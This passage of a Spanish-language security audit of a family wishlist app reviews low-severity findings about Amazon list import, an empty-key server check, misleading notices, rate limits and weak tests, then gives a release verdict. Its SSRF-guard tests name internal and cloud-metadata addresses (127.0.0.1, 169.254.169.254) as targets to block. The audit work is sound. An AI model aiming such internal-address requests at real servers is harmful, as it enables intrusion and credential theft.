*Comprobado.* Con ese texto, `soloEnlace` es `false`, `parseListaPegada` da 1 producto, `comoLista` da `null` y `listaId(firstUrl(text))` da el identificador. El resto del camino, por lectura; no lo he ejecutado en un Android ni en Playwright.

*Arreglo.* En `src/ui/screens/AddGift.tsx`: `if (id) return setStep({ kind: 'amazon', enlace: { id }, deOtraApp });`.

*Prueba.* En `e2e/amazon-lista.spec.ts`, junto a la de V-41: `compartir(page, texto)` con ese texto; cero llamadas a `amazonLista` hasta pulsar «Leer la lista».

### V-47 · Bajo · `servidor()` acepta una clave vacía

La comprobación de los 32 caracteres se ha quedado en el bloque de arranque. `servidor({ key: '' })` compara dos búferes vacíos y da por buena cualquier petición sin cabecera `x-lazo-key`. Sonda: `POST /unfurl` sin cabecera pasa la clave y llega al analizador de la URL.

*Escenario.* Hoy no se alcanza: en producción solo llama `index.mjs`, que sale con 1 si la clave es corta. Es una trampa para quien reutilice `servidor()` (otra entrada, otra prueba que acabe escuchando en una red) leyendo la clave de una variable sin definir.

*Arreglo.* Mover la comprobación dentro de `servidor()`: `if (typeof key !== 'string' || key.length < 32) throw new Error('Falta UNFURL_KEY (al menos 32 caracteres).');`, y que el arranque la capture para imprimir y salir.

*Prueba.* En `wishlist.test.mjs`: `assert.throws(() => servidor({ key: '', amazon: false }))`.

### V-48 · Bajo · Un fallo de `capacidades` se enseña como «apagada en tu servidor», y el aviso invita a reiniciar

Sin red, con la sesión caducada (401), con un 429 o un 5xx, `capacidades` devuelve `amazon: false` y la app dice «La importación automática está apagada en tu servidor», con los dos pasos para encenderla. Puede ser falso.

*Escenario.* El servidor la tiene encendida y el cortacircuitos acaba de saltar por un captcha. La hija, con mala cobertura, pega el enlace y enseña el aviso a su padre. Él repite `docker compose up -d --build`: el servicio se reinicia y con él el cortacircuitos y los cupos, que viven en memoria. La siguiente lectura vuelve a llamar a Amazon dentro de la hora de silencio. No es una fuga; es un aviso que empuja en contra de la única defensa de la IP de casa.

Menor, en el mismo aviso: los botones de copiar van antes que «lee los riesgos», cuando `SECURITY.md` dice que se enciende después de leerlos.

*Arreglo.* En `pocketbase.ts`, que `capacidades` distinga: `amazon: false` solo con un 200 o un 404 (servidor antiguo); en los demás casos, un tercer valor (`amazon: null`) que `conEnlace` trata como «No hemos podido preguntar a tu servidor; copia y pega la página», sin el aviso de encendido. En `Apagada`, subir la frase de los riesgos encima de los pasos.

*Prueba.* e2e: con `capacidades` devolviendo `null` (o lanzando), no aparece `AMAZON_IMPORT=on` y sí el modo manual. Hoy el caso «servidor antiguo, sin la ruta» fija lo contrario y habría que partirlo en dos.

### V-49 · Bajo · El enlace corto sigue fuera del tope global y sale sin toque

Dos restos de V-41 y V-42, los dos declarados en parte:

1. `resuelveCorto` no pasa por `cuentaPagina`. Su único freno es 30 por persona y hora, con hasta 4 saltos: una familia de diez puede llegar a 1 200 peticiones por hora a `amzn.eu`.
2. Un `amzn.eu/d/…` compartido desde otra app llama a `amazon-corto` sin que nadie pulse. Es coherente con lo que ya pasa con cualquier producto compartido (se lee la tienda sin preguntar), pero una app puede gastar los 30 de la persona y, si `amzn.eu` contesta 403, 429 o 503, dejar el cortacircuitos puesto una hora para todos.

*Arreglo.* (1) En `resuelveCorto`, `cuentaPagina(now)` antes de cada `get`, y `rate_limited` ya llega como `LIMITE`. Si se prefiere no mezclar los dos contadores, un `state.cortos` aparte con el mismo tope. (2) Aceptarlo y dejarlo escrito en `SECURITY.md`, o enseñar «Leer la lista» antes de resolver cuando `deOtraApp`; lo segundo añade un toque a cada producto compartido desde la app de Amazon, así que lo razonable es aceptarlo.

*Prueba.* `wishlist.test.mjs`: con 60 peticiones en la hora, `resuelveCorto` da `rate_limited` con cero peticiones.

### V-50 · Bajo · Tres pruebas que no fijan del todo lo que dicen

1. **AMZ-5.** `leeLista` convierte `blocked` en `error`, que es también lo que da una conexión rechazada. Con la mutación (`opts.dns` en lugar de `safeLookup`), los casos de `127.0.0.1` y `169.254.169.254` **pasan**; la prueba solo falla en el tercero, por un `timeout` de 6 s contra `10.0.0.1`. En una red donde esa IP rechace el 443, pasaría entera y el cuarto caso saldría a una IP pública. *Arreglo:* añadir la comprobación directa, `await assert.rejects(() => once(new URL('https://www.amazon.es/'), Date.now() + 2000, { dns }), { code: 'blocked' })`, para cada juego de direcciones.
2. **Arranque.** Nada prueba que `node index.mjs` escuche ni que salga con 1 sin clave. Es justo lo que cambia en la copia de trabajo, y su fallo es silencioso. *Arreglo:* una prueba que lance `node index.mjs` con `PORT` libre y una clave de 40 caracteres y espere el 200 de `/health`, y otra sin clave que espere el código 1.
3. **`saneaProducto`.** Un producto `null` lanza `TypeError` (lo recoge el `catch` de `leer` y se pierde la vista previa entera) y un `asin` que sea un array de un elemento pasa la expresión regular y se guarda como array (el enlace sale bien). *Arreglo:* `if (typeof p?.asin !== 'string') return null;` al principio, y esos dos casos en `amazonLista.test.ts`.

### V-51 · Bajo · `SECURITY.md` y la sección de estado no cuentan lo nuevo

`SECURITY.md` sigue en «5 lecturas por persona y hora y 30 enlaces cortos»: faltan el tope de 60 páginas por hora en todo el servidor, que el 403 también corta una hora y que un enlace llegado de otra app espera a un toque. «Estado en la v1.2.1» dice que `index.mjs` «solo arranca con `import.meta.main`», que deja de ser cierto con el cambio sin confirmar, y da V-41 por corregido sin la salvedad de V-46.

*Arreglo.* Tres frases en «Lectura de listas de Amazon» de `SECURITY.md` y `server/unfurl/test/wishlist.test.mjs` y `server/test/amazon.test.mjs` en la lista de pruebas (ya lo pedía V-45). Corregir las dos frases de la sección de estado cuando se confirme el cambio.

### Observaciones sin número

- En la hoja de fallo, «Reintentar» sale también con `LIMITE` y `AMAZON_BLOQUEA`. No llega a Amazon, pero con el tope del servidor cada toque gasta una de las 5 lecturas de la persona.
- Un miembro con sesión puede gastar las 60 páginas de la hora y dejar a los demás en `LIMITE`. Es el precio del tope y está dentro de la familia.
- `HEAD` todavía lleva `import.meta.main`: con un Node anterior a 24.2 el servicio no arranca y no dice nada. El cambio sin confirmar lo arregla y debe entrar en la versión.
- El `Dockerfile` sigue en `node:24-alpine` sin fijar por digest (G-12).

### Secretos

- **Repositorio.** En el diff y en el cambio sin confirmar no hay claves, tokens, rutas locales ni direcciones reales: solo IP de pruebas (`127.0.0.1`, `10.0.0.1`, `169.254.169.254`, `93.184.216.34`) y la clave de usar y tirar `'k'.repeat(40)`. `AMAZON_IMPORT=on` no es un secreto. Los únicos `.env*` en el índice son los dos `.env.example`; `.env`, `.env.local`, `server/.env`, `server/data/` y `server/unfurl/amazon.mjs` están ignorados. Búsqueda por patrones, sin `gitleaks`.
- **Builds.** El diff no añade ninguna variable `VITE_` ni lectura de `import.meta.env` en `src/`. `.env.local` no tiene ninguna variable con prefijo `VITE_` (he mirado nombres, no valores). `dist/`, `dist-demo/` y `android/app/src/main/assets/public/` de esta copia no contienen cadenas con forma de clave, pero **son anteriores a este código** (no llevan el aviso nuevo): no los he regenerado. Lo que la v1.2.1 añade al bundle son las tres constantes del aviso.
- **Sigue igual.** Los commits llevan el correo de un dominio corporativo (observación de la v1.1.2).

### Veredicto

**Apto** para publicar. No hay hallazgos críticos, altos ni medios; nadie ve nada nuevo de su propia lista, el aviso no filtra nada del servidor, `opts.dns` no es alcanzable desde una petición, el 404 con la función apagada se mantiene y no hay secretos en el repositorio.

Condiciones:

1. **Confirmar el cambio de `server/unfurl/index.mjs` antes de etiquetar**: es parte de lo auditado y sin él la versión depende de Node 24.2 o posterior.
2. **V-46 en esta misma versión**: es una línea y sin ella el `CHANGELOG` («Lazo ya no la lee sola») y el cierre de V-41 no son del todo ciertos.
3. V-47 a V-51 pueden ir en la siguiente. Los builds de la demo y del APK hay que regenerarlos con este código; los que hay en disco no los he auditado como v1.2.1.

### Estado tras la auditoría v1.2.1 (Opus 5.5)

- **Arranque de `unfurl`:** `import.meta.main` sustituido por `import.meta.url === pathToFileURL(process.argv[1]).href` (funciona con cualquier Node 24). Comprobado arrancando `node index.mjs` y pidiendo `/health`.
- **V-46:** corregido. `fromUrl` pasa `deOtraApp` también en la rama del enlace de lista; con él, V-41 queda cerrado. E2E de un texto largo compartido.
- **V-47:** corregido. `servidor()` lanza sin una clave de 32 caracteres; prueba.
- **V-48:** corregido. Solo un 404 (servidor antiguo) cuenta como apagada; sin red, 401 o 5xx se ofrece el modo manual sin el aviso de encendido. «Lee los riesgos» va antes de los pasos. E2E.
- **V-49:** el enlace corto cuenta para el tope global; que se resuelva sin pulsar al llegar de otra app queda aceptado en `SECURITY.md`.
- **V-50:** `saneaProducto` descarta `null`, arrays y ASIN que no son texto (prueba). Pendiente: la prueba de la guarda de IP sigue dependiendo de `opts.dns`; queda para la próxima versión.
- **V-51:** corregido (`SECURITY.md` y este estado).
